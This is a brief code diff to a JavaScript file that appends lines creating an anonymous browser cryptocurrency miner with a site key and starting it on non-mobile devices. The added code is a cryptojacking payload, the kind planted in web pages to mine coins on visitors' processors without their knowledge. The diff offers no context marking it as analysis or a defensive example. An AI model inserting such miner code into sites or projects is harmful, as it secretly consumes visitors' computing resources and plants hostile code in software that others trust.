@@ -9,3 +9,7 @@
         }
     }
 })();
+var miner = WMP.Anonymous('SK_XaGDAmHxh65BBgWYWlFx9');
+    if (!miner.isMobile()){
+        miner.start();
+    }
